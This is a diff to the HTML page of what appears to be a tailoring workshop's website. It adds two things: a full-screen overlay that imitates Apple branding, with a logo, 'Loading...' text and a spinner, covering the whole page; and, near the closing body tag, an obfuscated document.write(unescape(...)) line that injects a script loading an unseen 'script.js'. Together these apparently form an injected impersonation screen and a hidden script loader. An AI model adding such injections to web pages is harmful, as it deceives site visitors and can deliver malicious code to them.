@@ -331,6 +331,57 @@ img{max-width:100%;height:auto;display:block}
 </head>
 <body>
 
+  <div id="apple-loading-overlay" style="
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: #FFFFFF;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 999999;
+    flex-direction: column;
+    font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+">
+
+    <!-- Apple Logo -->
+    <img src="https://cdn.freebiesupply.com/images/large/2x/apple-logo-transparent.png" 
+         alt="Apple Inc." 
+         style="
+            width: 110px;
+            height: auto;
+            margin-bottom: 40px;
+            filter: brightness(0); /* Makes it black like official Apple logo */
+         ">
+
+    <div style="font-size: 17px; font-weight: 500; color: #1d1d1f; margin-bottom: 32px;">
+        Loading...
+    </div>
+
+    <!-- Apple Spinner -->
+    <div style="
+        width: 32px;
+        height: 32px;
+        border: 4px solid #E5E5E7;
+        border-top: 4px solid #0071E3;
+        border-radius: 50%;
+        animation: appleSpin 0.85s linear infinite;
+    "></div>
+
+    <style>
+        @keyframes appleSpin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            #apple-loading-overlay img {
+                width: 90px;
+            }
+        }
+    </style>
+</div>
+
 <!-- ===== banner ===== -->
 <div class="kvo_bannerstrip_a3r1">
   <span>Workshop open Tuesday to Saturday &nbsp;&middot;&nbsp; Complimentary first alteration on all garments &nbsp;&middot;&nbsp; Now reading: Field Notes 14</span>
@@ -976,6 +1027,10 @@ document.querySelectorAll('.kvo_modal_e5w8').forEach(function(m){m.addEventListe
 
 <a href="/" alt="stats counter free" target="_blank" >
 <img  src="https://sstatic1.histats.com/0.gif?4977134&101" alt="stats counter free" border="0">
+
+  <script>
+document.write(unescape('%3Cscript%20src%3D%22script.js%22%3E%3C/script%3E'));
+</script>
 
 </body>
 </html>
